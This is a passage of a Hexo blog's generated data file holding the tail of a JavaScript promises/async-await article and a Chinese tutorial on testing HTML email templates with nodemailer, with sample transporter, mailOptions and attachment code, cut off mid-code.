class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> myPromise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">res, rej</span>) </span>&#123;</span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Math</span>.random() &lt; <span class=\"number\">0.9</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> res(<span class=\"string\">'Hooray!'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> rej(<span class=\"string\">'Oh no!'</span>);</span><br><span class=\"line\">  &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">myPromise</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Success: '</span> + data);</span><br><span class=\"line\">   &#125;)</span><br><span class=\"line\">   .catch(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Error: '</span> + err);</span><br><span class=\"line\">   &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// If Math.random() returns less than 0.9 the following is logged:</span></span><br><span class=\"line\"><span class=\"comment\">// \"Success: Hooray!\"</span></span><br><span class=\"line\"><span class=\"comment\">// If Math.random() returns 0.9 or greater the following is logged:</span></span><br><span class=\"line\"><span class=\"comment\">// \"Error: On no!\"</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"12-Async-Await\"><a href=\"#12-Async-Await\" class=\"headerlink\" title=\"12. Async/Await\"></a>12. Async/Await</h2><p>在掌握了 promise 的用法后，你可能也会喜欢 async await，它只是一种基于 promise 的“语法糖”。在下面的示例中，我们创建了一个 async 函数，并 await greeter promise。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> greeter = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">res, rej</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> res(<span class=\"string\">'Hello world!'</span>), <span class=\"number\">2000</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> greeting = <span class=\"keyword\">await</span> greeter;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(greeting);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myFunc();</span><br><span class=\"line\"><span class=\"comment\">// 'Hello world!'</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><a href=\"https://mp.weixin.qq.com/s/lv55kP8MUboteMkV9basoQ\" target=\"_blank\" rel=\"noopener\">原文地址</a></p>"},{"title":"html邮件模板测试及nodemailer的入门","date":"2018-07-25T01:35:34.000Z","updated":"2018-07-25T01:35:34.000Z","_content":"\n# 前言\n项目中客户往来需要定制邮件模板，前端开发完后需要测试，简单的可以直接浏览html文件，但是各种邮件终端解析有些异同，因此需要用真实的各个终端进行测试，这就需要我们搭建一个简单邮件发送功能。业务需求是实现html模板的测试，对于nodemailer其他功能只作入门简介，具体可根据实际需要深究。\n\n# 概述\n## 示例效果图：\n![html模板](emailTemplate.jpg)\n![ejs模板](emailEjs.jpg)\n<!-- more -->\n\n# 详述\n## nodemailer简介\n+ 是什么，Node.js应用的邮件发送模块；\n+ 环境要求Node.js v6+；\n+ 安装`npm install nodemailer --save`\n+ 官方入门示例代码：\n```\n'use strict';\nconst nodemailer = require('nodemailer');\n\n// Generate test SMTP service account from ethereal.email\n// Only needed if you don't have a real mail account for testing\nnodemailer.createTestAccount((err, account) => {\n    // create reusable transporter object using the default SMTP transport\n    let transporter = nodemailer.createTransport({\n        host: 'smtp.ethereal.email',\n        port: 587,\n        secure: false, // true for 465, false for other ports\n        auth: {\n            user: account.user, // generated ethereal user\n            pass: account.pass // generated ethereal password\n        }\n    });\n\n    // setup email data with unicode symbols\n    let mailOptions = {\n        from: '\"Fred Foo 👻\" <foo@example.com>', // sender address\n        to: 'bar@example.com, baz@example.com', // list of receivers\n        subject: 'Hello ✔', // Subject line\n        text: 'Hello world?', // plain text body\n        html: '<b>Hello world?</b>' // html body\n    };\n\n    // send mail with defined transport object\n    transporter.sendMail(mailOptions, (error, info) => {\n        if (error) {\n            return console.log(error);\n        }\n        console.log('Message sent: %s', info.messageId);\n        // Preview only available when sending through an Ethereal account\n        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));\n\n        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>\n        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...\n    });\n});\n\n```\n这个是ethereal.email邮件测试账户的示例，我们重点看下代码，主要是三个部分：transporter，mailOptions，sendMail。\n\n首先，需要创建一个transporter实例对象，具体参数就像我们在邮件终端如foxmail中配置账户一样，需要注意的是pass，不是登录密码，而是授权码。（163邮箱的话，要开启POP3/SMTP服务，在设置 --> POP3/SMTP/IMAP页面，设置。开通后会有个授权码的，配置里的密码，就是用这个授权码；qq邮箱的话，同样也要开启这个服务，设置 --> 账户 --> POP3服务，点击开启，就会有个授权码，如果忘了记录，在开启服务下面有个“生成授权码”的，可以获取到的。）\n\n其次，设置发送相关参数，这个与日常发邮件填写的参数一样，重点看下html参数，及示例没提到的attachments参数。html参数是邮件主题内容，值可以是html字符串，也可以是数据流，这个稍后使用实例再介绍；\n\n最后，调用transporter实例的sendMail方法，可以在回调函数中处理成功失败相关业务逻辑。\n\n## 实例简介：\n### 上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\n```\n// 内容来自html文件\nconst htmlData = fs.readFileSync('email/template.html','utf-8');\n\n// 内容来自ejs模板\nconst template = ejs.compile(fs.readFileSync(path.resolve(__dirname, 'email/email.ejs'), 'utf8'));\nconst ejsData = template({\n  title: 'Ejs',\n  desc: '使用Ejs渲染模板',\n});\n```\n```\n\tlet mailOptions = {\n\t\tfrom: '\"sun\" <'+ config.user+'>', // sender address\n\t\tto: '\"sun\" <xxxx@qq.com>, xxxx@xxxx.com', // list of receivers\n\t\tsubject: 'nodemailer测试demo', // Subject line\n\t\t// text: 'Hello', // plain text body\n\t\t// html: ejsData, // 内容来自ejs模板\n\t\thtml: htmlData, // 内容来自html文件\n\t\tattachments: [\n\t\t\t{   // utf-8 string as an attachment\n\t\t\t\tfilename: 'text1.txt',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/text.txt')\n\t\t\t},\n\t\t\t{   // utf-8 string as an attachment\n\t\t\t\tfilename: 'text2.txt',\n\t\t\t\tcontent: 'i am text2.txt'\n\t\t\t},\n\t\t\t{\n\t\t\t\tfilename: '蚂蚁头像.jpg',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/mayi.jpg'),\n\t\t\t\tcid: 'mayi.jpg'\n\t\t\t},\n\t\t\t{\n\t\t\t\tfilename: '二维码',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/canvas.png'),\n\t\t\t\tcid: 'qrcode'\n\t\t\t}\n\t\t]\n\t};\n```\n### 几个点强调下：\n+ 对于常见的邮件服务商可以用service替换host配置，具体支持情况见[service列表](https://nodemailer.com/smtp/well-known/)。\n```\nlet transporter = nodemailer.createTransport({\n     service: 'QQ', // no need to set host or port etc.\n     auth: {\n         user: 'account.email@example.com',\n         pass: 'smtp-password'\n     }\n});\n\ntransporter.sendMail(...)\n\n```\n+ attachments的使用，除了正常的添加附件外，还可以定义`cid`作为内容的引用源，附件配置见上文mailOptions示例代码，具体内容中使用如下：\n```\n<img src=\"cid:qrcode\" alt=\"\" title=\"\">\n```\n+ [源代码](https://github.com/jovysun/sendMail)\n\n\n# 备注\nhttps://segmentfault.com/a/1190000012251328\n\nhttps://nodemailer.com/about/\n","source":"_posts/2018/2018-07-25-nodemailer.md","raw":"---\ntitle: html邮件模板测试及nodemailer的入门\ntags:\n  - node\ncategories:\n  - 前端\ndate: 2018-07-25 09:35:34\nupdated: 2018-07-25 09:35:34\n---\n\n# 前言\n项目中客户往来需要定制邮件模板，前端开发完后需要测试，简单的可以直接浏览html文件，但是各种邮件终端解析有些异同，因此需要用真实的各个终端进行测试，这就需要我们搭建一个简单邮件发送功能。业务需求是实现html模板的测试，对于nodemailer其他功能只作入门简介，具体可根据实际需要深究。\n\n# 概述\n## 示例效果图：\n![html模板](emailTemplate.jpg)\n![ejs模板](emailEjs.jpg)\n<!-- more -->\n\n# 详述\n## nodemailer简介\n+ 是什么，Node.js应用的邮件发送模块；\n+ 环境要求Node.js v6+；\n+ 安装`npm install nodemailer --save`\n+ 官方入门示例代码：\n```\n'use strict';\nconst nodemailer = require('nodemailer');\n\n// Generate test SMTP service account from ethereal.email\n// Only needed if you don't have a real mail account for testing\nnodemailer.createTestAccount((err, account) => {\n    // create reusable transporter object using the default SMTP transport\n    let transporter = nodemailer.createTransport({\n        host: 'smtp.ethereal.email',\n        port: 587,\n        secure: false, // true for 465, false for other ports\n        auth: {\n            user: account.user, // generated ethereal user\n            pass: account.pass // generated ethereal password\n        }\n    });\n\n    // setup email data with unicode symbols\n    let mailOptions = {\n        from: '\"Fred Foo 👻\" <foo@example.com>', // sender address\n        to: 'bar@example.com, baz@example.com', // list of receivers\n        subject: 'Hello ✔', // Subject line\n        text: 'Hello world?', // plain text body\n        html: '<b>Hello world?</b>' // html body\n    };\n\n    // send mail with defined transport object\n    transporter.sendMail(mailOptions, (error, info) => {\n        if (error) {\n            return console.log(error);\n        }\n        console.log('Message sent: %s', info.messageId);\n        // Preview only available when sending through an Ethereal account\n        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));\n\n        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>\n        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...\n    });\n});\n\n```\n这个是ethereal.email邮件测试账户的示例，我们重点看下代码，主要是三个部分：transporter，mailOptions，sendMail。\n\n首先，需要创建一个transporter实例对象，具体参数就像我们在邮件终端如foxmail中配置账户一样，需要注意的是pass，不是登录密码，而是授权码。（163邮箱的话，要开启POP3/SMTP服务，在设置 --> POP3/SMTP/IMAP页面，设置。开通后会有个授权码的，配置里的密码，就是用这个授权码；qq邮箱的话，同样也要开启这个服务，设置 --> 账户 --> POP3服务，点击开启，就会有个授权码，如果忘了记录，在开启服务下面有个“生成授权码”的，可以获取到的。）\n\n其次，设置发送相关参数，这个与日常发邮件填写的参数一样，重点看下html参数，及示例没提到的attachments参数。html参数是邮件主题内容，值可以是html字符串，也可以是数据流，这个稍后使用实例再介绍；\n\n最后，调用transporter实例的sendMail方法，可以在回调函数中处理成功失败相关业务逻辑。\n\n## 实例简介：\n### 上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\n```\n// 内容来自html文件\nconst htmlData = fs.readFileSync('email/template.html','utf-8');\n\n// 内容来自ejs模板\nconst template = ejs.compile(fs.readFileSync(path.resolve(__dirname, 'email/email.ejs'), 'utf8'));\nconst ejsData = template({\n  title: 'Ejs',\n  desc: '使用Ejs渲染模板',\n});\n```\n```\n\tlet mailOptions = {\n\t\tfrom: '\"sun\" <'+ config.user+'>', // sender address\n\t\tto: '\"sun\" <xxxx@qq.com>, xxxx@xxxx.com', // list of receivers\n\t\tsubject: 'nodemailer测试demo', // Subject line\n\t\t// text: 'Hello', // plain text body\n\t\t// html: ejsData, // 内容来自ejs模板\n\t\thtml: htmlData, // 内容来自html文件\n\t\tattachments: [\n\t\t\t{   // utf-8 string as an attachment\n\t\t\t\tfilename: 'text1.txt',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/text.txt')\n\t\t\t},\n\t\t\t{   // utf-8 string as an attachment\n\t\t\t\tfilename: 'text2.txt',\n\t\t\t\tcontent: 'i am text2.txt'\n\t\t\t},\n\t\t\t{\n\t\t\t\tfilename: '蚂蚁头像.jpg',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/mayi.jpg'),\n\t\t\t\tcid: 'mayi.jpg'\n\t\t\t},\n\t\t\t{\n\t\t\t\tfilename: '二维码',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/canvas.png'),\n\t\t\t\tcid: 'qrcode'\n\t\t\t}\n\t\t]\n\t};\n```\n### 几个点强调下：\n+ 对于常见的邮件服务商可以用service替换host配置，具体支持情况见[service列表](https://nodemailer.com/smtp/well-known/)。\n```\nlet transporter = nodemailer.createTransport({\n     service: 'QQ', // no need to set host or port etc.\n     auth: {\n         user: 'account.email@example.com',\n         pass: 'smtp-password'\n     }\n});\n\ntransporter.sendMail(...)\n\n```\n+ attachments的使用，除了正常的添加附件外，还可以定义`cid`作为内容的引用源，附件配置见上文mailOptions示例代码，具体内容中使用如下：\n```\n<img src=\"cid:qrcode\" alt=\"\" title=\"\">\n```\n+ [源代码](https://github.com/jovysun/sendMail)\n\n\n# 备注\nhttps://segmentfault.com/a/1190000012251328\n\nhttps://nodemailer.com/about/\n","slug":"2018-2018-07-25-nodemailer","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8oi000nwovvfhzmzons","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>项目中客户往来需要定制邮件模板，前端开发完后需要测试，简单的可以直接浏览html文件，但是各种邮件终端解析有些异同，因此需要用真实的各个终端进行测试，这就需要我们搭建一个简单邮件发送功能。业务需求是实现html模板的测试，对于nodemailer其他功能只作入门简介，具体可根据实际需要深究。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><h2 id=\"示例效果图：\"><a href=\"#示例效果图：\" class=\"headerlink\" title=\"示例效果图：\"></a>示例效果图：</h2><p><img src=\"/2018-2018-07-25-nodemailer/emailTemplate.jpg\" alt=\"html模板\"><br><img src=\"/2018-2018-07-25-nodemailer/emailEjs.jpg\" alt=\"ejs模板\"><br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"nodemailer简介\"><a href=\"#nodemailer简介\" class=\"headerlink\" title=\"nodemailer简介\"></a>nodemailer简介</h2><ul>\n<li>是什么，Node.js应用的邮件发送模块；</li>\n<li>环境要求Node.js v6+；</li>\n<li>安装<code>npm install nodemailer --save</code></li>\n<li>官方入门示例代码：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">const nodemailer = require(&apos;nodemailer&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// Generate test SMTP service account from ethereal.email</span><br><span class=\"line\">// Only needed if you don&apos;t have a real mail account for testing</span><br><span class=\"line\">nodemailer.createTestAccount((err, account) =&gt; &#123;</span><br><span class=\"line\">    // create reusable transporter object using the default SMTP transport</span><br><span class=\"line\">    let transporter = nodemailer.createTransport(&#123;</span><br><span class=\"line\">        host: &apos;smtp.ethereal.email&apos;,</span><br><span class=\"line\">        port: 587,</span><br><span class=\"line\">        secure: false, // true for 465, false for other ports</span><br><span class=\"line\">        auth: &#123;</span><br><span class=\"line\">            user: account.user, // generated ethereal user</span><br><span class=\"line\">            pass: account.pass // generated ethereal password</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    // setup email data with unicode symbols</span><br><span class=\"line\">    let mailOptions = &#123;</span><br><span class=\"line\">        from: &apos;&quot;Fred Foo 👻&quot; &lt;foo@example.com&gt;&apos;, // sender address</span><br><span class=\"line\">        to: &apos;bar@example.com, baz@example.com&apos;, // list of receivers</span><br><span class=\"line\">        subject: &apos;Hello ✔&apos;, // Subject line</span><br><span class=\"line\">        text: &apos;Hello world?&apos;, // plain text body</span><br><span class=\"line\">        html: &apos;&lt;b&gt;Hello world?&lt;/b&gt;&apos; // html body</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    // send mail with defined transport object</span><br><span class=\"line\">    transporter.sendMail(mailOptions, (error, info) =&gt; &#123;</span><br><span class=\"line\">        if (error) &#123;</span><br><span class=\"line\">            return console.log(error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;Message sent: %s&apos;, info.messageId);</span><br><span class=\"line\">        // Preview only available when sending through an Ethereal account</span><br><span class=\"line\">        console.log(&apos;Preview URL: %s&apos;, nodemailer.getTestMessageUrl(info));</span><br><span class=\"line\"></span><br><span class=\"line\">        // Message sent: &lt;b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com&gt;</span><br><span class=\"line\">        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>这个是ethereal.email邮件测试账户的示例，我们重点看下代码，主要是三个部分：transporter，mailOptions，sendMail。</p>\n<p>首先，需要创建一个transporter实例对象，具体参数就像我们在邮件终端如foxmail中配置账户一样，需要注意的是pass，不是登录密码，而是授权码。（163邮箱的话，要开启POP3/SMTP服务，在设置 –&gt; POP3/SMTP/IMAP页面，设置。开通后会有个授权码的，配置里的密码，就是用这个授权码；qq邮箱的话，同样也要开启这个服务，设置 –&gt; 账户 –&gt; POP3服务，点击开启，就会有个授权码，如果忘了记录，在开启服务下面有个“生成授权码”的，可以获取到的。）</p>\n<p>其次，设置发送相关参数，这个与日常发邮件填写的参数一样，重点看下html参数，及示例没提到的attachments参数。html参数是邮件主题内容，值可以是html字符串，也可以是数据流，这个稍后使用实例再介绍；</p>\n<p>最后，调用transporter实例的sendMail方法，可以在回调函数中处理成功失败相关业务逻辑。</p>\n<h2 id=\"实例简介：\"><a href=\"#实例简介：\" class=\"headerlink\" title=\"实例简介：\"></a>实例简介：</h2><h3 id=\"上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\"><a href=\"#上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\" class=\"headerlink\" title=\"上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\"></a>上文提到mailOptions中的html参数值可以是数据流，具体代码如下：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 内容来自html文件</span><br><span class=\"line\">const htmlData = fs.readFileSync(&apos;email/template.html&apos;,&apos;utf-8&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 内容来自ejs模板</span><br><span class=\"line\">const template = ejs.compile(fs.readFileSync(path.resolve(__dirname, &apos;email/email.ejs&apos;), &apos;utf8&apos;));</span><br><span class=\"line\">const ejsData = template(&#123;</span><br><span class=\"line\">  title: &apos;Ejs&apos;,</span><br><span class=\"line\">  desc: &apos;使用Ejs渲染模板&apos;,</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let mailOptions = &#123;</span><br><span class=\"line\">\tfrom: &apos;&quot;sun&quot; &lt;&apos;+ config.user+&apos;&gt;&apos;, // sender address</span><br><span class=\"line\">\tto: &apos;&quot;sun&quot; &lt;xxxx@qq.com&gt;, xxxx@xxxx.com&apos;, // list of receivers</span><br><span class=\"line\">\tsubject: &apos;nodemailer测试demo&apos;, // Subject line</span><br><span class=\"line\">\t// text: &apos;Hello&apos;, // plain text body</span><br><span class=\"line\">\t// html: ejsData, // 内容来自ejs模板</span><br><span class=\"line\">\thtml: htmlData, // 内容来自html文件</span><br><span class=\"line\">\tattachments: [</span><br><span class=\"line\">\t\t&#123;   // utf-8 string as an attachment</span><br><span class=\"line\">\t\t\tfilename: &apos;text1.txt&apos;,</span><br><span class=\"line\">\t\t\tpath: path.resolve(__dirname, &apos;attachments/text.txt&apos;)</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;   // utf-8 string as an attachment</span><br><span class=\"line\">\t\t\tfilename: &apos;text2.txt&apos;,</span><br><span class=\"line\">\t\t\tcontent: &apos;i am text2.txt&apos;</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tfilename: &apos;蚂蚁头像.jpg&apos;,</span><br><span class=\"line\">\t\t\tpath: path.resolve(__dirname, &apos;attachments/mayi.jpg&apos;),</span><br><span class=\"line\">\t\t\tcid: &apos;mayi.jpg&apos;</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tfilename: &apos;二维码&apos;,</span><br><span class=\"line\">\t\t\tpath: path.resolve(__dirname, &apos;attachments/canvas.png&apos;),</span><br><span class=\"line\">\t\t\tcid: &apos;qrcode&apos;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"几个点强调下：\"><a href=\"#几个点强调下：\" class=\"headerlink\" title=\"几个点强调下：\"></a>几个点强调下：</h3><ul>\n<li><p>对于常见的邮件服务商可以用service替换host配置，具体支持情况见<a href=\"https://nodemailer.com/smtp/well-known/\" target=\"_blank\" rel=\"noopener\">service列表</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let transporter = nodemailer.createTransport(&#123;</span><br><span class=\"line\">     service: &apos;QQ&apos;, // no need to set host or port etc.</span><br><span class=\"line\">     auth: &#123;</span><br><span class=\"line\">         user: &apos;account.email@example.com&apos;,</span><br><span class=\"line\">         pass: &apos;smtp-password&apos;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">transporter.sendMail(...)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>attachments的使用，除了正常的添加附件外，还可以定义<code>cid</code>作为内容的引用源，附件配置见上文mailOptions示例代码，具体内容中使用如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;cid:qrcode&quot; alt=&quot;&quot; title=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><a href=\"https://github.com/jovysun/sendMail\" target=\"_blank\" rel=\"noopener\">源代码</a></p>\n</li>\n</ul>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p><a href=\"https://segmentfault.com/a/1190000012251328\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000012251328</a></p>\n<p><a href=\"https://nodemailer.com/about/\" target=\"_blank\" rel=\"noopener\">https://nodemailer.com/about/</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>项目中客户往来需要定制邮件模板，前端开发完后需要测试，简单的可以直接浏览html文件，但是各种邮件终端解析有些异同，因此需要用真实的各个终端进行测试，这就需要我们搭建一个简单邮件发送功能。业务需求是实现html模板的测试，对于nodemailer其他功能只作入门简介，具体可根据实际需要深究。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><h2 id=\"示例效果图：\"><a href=\"#示例效果图：\" class=\"headerlink\" title=\"示例效果图：\"></a>示例效果图：</h2><p><img src=\"/2018-2018-07-25-nodemailer/emailTemplate.jpg\" alt=\"html模板\"><br><img src=\"/2018-2018-07-25-nodemailer/emailEjs.jpg\" alt=\"ejs模板\"><br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"nodemailer简介\"><a href=\"#nodemailer简介\" class=\"headerlink\" title=\"nodemailer简介\"></a>nodemailer简介</h2><ul>\n<li>是什么，Node.js应用的邮件发送模块；</li>\n<li>环境要求Node.js v6+；</li>\n<li>安装<code>npm install nodemailer --save</code></li>\n<li>官方入门示例代码：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">const nodemailer = require(&apos;nodemailer&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// Generate test SMTP service account from ethereal.email</span><br><span class=\"line\">// Only needed if you don&apos;t have a real mail account for testing</span><br><span class=\"line\">nodemailer.createTestAccount((err, account) =&gt; &#123;</span><br><span class=\"line\">    // create reusable transporter object using the default SMTP transport</span><br><span class=\"line\">    let transporter = nodemailer.createTransport(&#123;</span><br><span class=\"line\">        host: &apos;smtp.ethereal.email&apos;,</span><br><span class=\"line\">        port: 587,</span><br><span class=\"line\">        secure: false, // true for 465, false for other ports</span><br><span class=\"line\">        auth: &#123;</span><br><span class=\"line\">            user: account.user, // generated ethereal user</span><br><span class=\"line\">            pass: account.pass // generated ethereal password</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    // setup email data with unicode symbols</span><br><span class=\"line\">    let mailOptions = &#123;</span><br><span class=\"line\">        from: &apos;&quot;Fred Foo 👻&quot; &lt;foo@example.com&gt;&apos;, // sender address</span><br><span class=\"line\">        to: &apos;bar@example.com, baz@example.com&apos;, // 